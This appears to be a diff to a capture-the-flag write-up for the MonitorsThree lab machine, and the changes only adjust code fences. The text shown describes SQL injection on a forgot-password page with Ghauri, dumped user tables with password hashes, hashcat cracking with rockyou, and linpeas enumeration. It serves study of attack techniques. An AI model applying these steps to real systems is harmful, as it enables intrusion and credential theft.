@@ -58,7 +58,7 @@ ID           Response   Lines    Word       Chars       Payload
 using `'`  in http://monitorsthree.htb/forgot_password.php we find sql error and use Ghauri for SQL injection: 
 
 ![135e5b6ec2acf567cee994423c6cd01f.png]({{site.baseurl}}/images/post/135e5b6ec2acf567cee994423c6cd01f.png)
-```
+
 Database: monitorsthree_db
 Table: users
 [4 entries]
@@ -70,9 +70,10 @@ Table: users
 | 6  | janderson | janderson@monitorsthree.htb | 1e68b6eb86b45f6d92f8f292428f77ac | Jennifer Anderson | Network Engineer      | 1990-07-30 | 2021-06-20 | 68000.00  |                                            
 | 5  | mwatson   | dthompson@monitorsthree.htb | 633b683cc128fe244b00f176c8a950f5 | David Thompson    | Database Manager      | 1982-11-23 | 2022-09-15 | 83000.00  |                                            
 +----+-----------+-----------------------------+----------------------------------+-------------------+-----------------------+------------+------------+-----------+                                            
+
 [22:50:02] [INFO] table 'monitorsthree_db.users' dumped to CSV file '/home/w3rew01f/.ghauri/monitorsthree.htb/dump/monitorsthree_db/users.csv'
 
-```
+
 
 Using hashcat hashid and rockyou list we crack the hash:
 ![96cbaa7dc84d9ec21c202cebfb397f2f.png]({{site.baseurl}}/images/post/96cbaa7dc84d9ec21c202cebfb397f2f.png)
@@ -92,7 +93,8 @@ using linpeas we find a database
 Active 3306 port here 
 ![23ee3a00966866b1073ba303489c6e0e.png]({{site.baseurl}}/images/post/23ee3a00966866b1073ba303489c6e0e.png)
 
-```
+
+
 +----+----------+--------------------------------------------------------------+-------+---------------+--------------------------+----------------------+-----------------+-----------+-----------+--------------+----------------+------------+---------------+--------------+--------------+------------------------+---------+------------+-----------+------------------+--------+-----------------+----------+-------------+
 | id | username | password                                                     | realm | full_name     | email_address            | must_change_password | password_change | show_tree | show_list | show_preview | graph_settings | login_opts | policy_graphs | policy_trees | policy_hosts | policy_graph_templates | enabled | lastchange | lastlogin | password_history | locked | failed_attempts | lastfail | reset_perms |
 +----+----------+--------------------------------------------------------------+-------+---------------+--------------------------+----------------------+-----------------+-----------+-----------+--------------+----------------+------------+---------------+--------------+--------------+------------------------+---------+------------+-----------+------------------+--------+-----------------+----------+-------------+
@@ -101,7 +103,6 @@ Active 3306 port here
 |  4 | marcus   | $2y$10$Fq8wGXvlM3Le.5LIzmM9weFs9s6W2i1FLg3yrdNGmkIaxo79IBjtK |     0 | Marcus        | marcus@monitorsthree.htb |                      | on              | on        | on        | on           | on             |          1 |             1 |            1 |            1 |                      1 | on      |         -1 |        -1 |                  |        |               0 |        0 |  1677427318 |
 +----+----------+--------------------------------------------------------------+-------+---------------+--------------------------+----------------------+-----------------+-----------+-----------+--------------+----------------+------------+---------------+--------------+--------------+------------------------+---------+------------+-----------+------------------+--------+-----------------+----------+-------------+
 
-```
 Using hashcat we get the password for marcus
 ![4b6eb0c5fb608ca27e0d603cfe9ba554.png]({{site.baseurl}}/images/post/4b6eb0c5fb608ca27e0d603cfe9ba554.png)
 
